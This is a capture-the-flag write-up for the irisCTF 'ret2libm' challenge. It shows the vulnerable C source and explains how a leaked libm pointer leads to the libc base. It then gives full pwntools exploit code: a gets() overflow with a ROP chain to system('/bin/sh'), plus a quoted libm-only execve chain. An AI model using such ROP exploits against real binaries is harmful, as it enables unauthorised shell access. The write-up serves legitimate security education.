---
title: "irisCTF ret2libm"
date: 2023-02-01T12:13:32+05:30
description: "ret2libc but someone added this libm thing... What is that?"
tags: [python, ret2libc, pwn]
---

## The Challenge

I need to make a pwn? Let's go with that standard warmup rop thing... what was it... ret2libm?\
Author: sera\
[ret2libm.zip](https://cdn.discordapp.com/attachments/1056103369695047750/1056146650860621834/ret2libm.zip) / [Dockerfile](https://cdn.discordapp.com/attachments/1056103369695047750/1061498899271004251/Dockerfile)

## The Provided ZIP

- chal
  - Provided binary
- chal.c
  - Source which binary comes from
- libc-2.27.so
  - Provided libc version
- libm-2.27.so
  - Provided libm version
- Makefile
  - Provided compilation flags

## What is libm?

- `#include <math.h>`
  - libm is the standard math library for C.

## Where does libm live?

```x86asm
$ ldd chal
        linux-vdso.so.1 (0x00007fffd53f5000)
        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007efd9df21000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007efd9dd40000)
        /lib64/ld-linux-x86-64.so.2 (0x00007efd9e247000)
```

libm lives above libc in the dynamic linking of the binary, meaning we can compute the base address of libc from the base address of libm since the offset is always the same.

## chal.c

```c
#include <math.h>
#include <stdio.h>

int main(int argc, char* argv) {
    char yours[8];
    printf("Check out my pecs: %p\n", fabs);    // Function pointer leak
    printf("How about yours? ");
    gets(yours);                                // Vulnerable gets() call
    printf("Let's see how they stack up.");
    return 0;
}
```

## Plan of Attack

1. Get the leaked fabs() address
2. Calculate the base address of libm
3. Calculate the base address of libc
4. Overflow the gets() call
5. Build a ROP chain off of libc gadgets
6. Shell?

## Actually Executing That

1. Get the leaked fabs() address

```py
p.recvuntil(b'pecs: ')
fabs_libm_leak = int(p.recvline().strip(b"\n"), 0)
```

2. Calculate the base address of libm

```py
# fabsf64 from GDB
# readelf -s libm-2.27.so | grep fabsf64
# 0x7fe539640000 - 0x7fe539a31000 = 0x3f1000 
# Offset = 0x31cf0
libm.address = fabs_libm_leak - (libm.sym['fabsf64']) 
```

3. Let’s finish up this PWN!

```py
libc.address = libm.address - 0x3f1000                      # Use calculated offset to set libc
…
chain = b''
chain += cyclic(16)                                         # 16 Byte Overflow
chain += p64(r_libc.find_gadget(['ret'])[0])                # Realign stack
chain += p64(r_libc.find_gadget(['pop rdi', 'ret'])[0])     # system() paremeter
chain += p64(next(libc.search(b'/bin/sh')))                 # Load /bin/sh into system()
chain += p64(libc.sym['system'])                            # Run as system call
…
p.interactive()
```

## Flag Acquired

`irisctf{oh_ its_ ret2libc_anyway}`

## Cool Other Write-Up

All credit for the code below is from [Elvis#6356](https://discord.com/channels/1051808836593397781/1061791437785677905/1061922707874263172). This uses only libm to build the exploit and make an execve syscall.

```py
    syscall = libm_base + 0x3f39
    pop_rsi = libm_base + 0x289d3
    pop_rdi = libm_base + 0x0bc37
    pop_rdx = libm_base + 0x4c5c2
    pop_rax = libm_base + 0x1a3c8
    mov_dword_rdi_edx = libm_base + 0x51106     # Used to load /bin/sh into writable memory
...
   payload += p64(pop_rdi)
    payload += p64(writable_addr)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(pop_rax)
    payload += p64(59)
    payload += p64(syscall)                     # execve(“/bin/sh”, 0, 0)
```

## Final Exploit Code

```py
# ret2libm2libc
from pwn import *
context.log_level = 'debug'

# Setup for Run
binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]

# Break gets()
gs = '''
break *main+131
continue
'''

# Load In Binary & ROPGadget it
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

# Stuff
p = start()

# Leak LibM address
p.recvuntil(b'pecs: ')
fabs_addr = p.recvline().strip(b"\n")
print(fabs_addr)
fabs_libm_leak = int(fabs_addr, 0)

# Load in teh libs
libc = ELF('libc-2.27.so', checksec = False)
libm = ELF('libm-2.27.so', checksec = False)

# Calculate LibM base
libm.address = fabs_libm_leak - (libm.sym['fabsf64']) # fabsf64 from GDB # 0x31cf0
log.info('LibM base is at 0x%x ' %libm.address)


# Set LibC address correctly
libc.address = libm.address - 0x3f1000
log.info('LibC base is at 0x%x ' %libc.address)

# ROP LibC with new base addresses
r_libc = ROP(libc)

# ret2libc chain
chain = b''
chain += cyclic(16)
chain += p64(r_libc.find_gadget(['ret'])[0])            
chain += p64(r_libc.find_gadget(['pop rdi', 'ret'])[0]) 
chain += p64(next(libc.search(b'/bin/sh')))            
chain += p64(libc.sym['system'])                        

# Send the chain
p.sendlineafter(b'How about yours?', chain)

# Shell plz?
p.interactive()
```
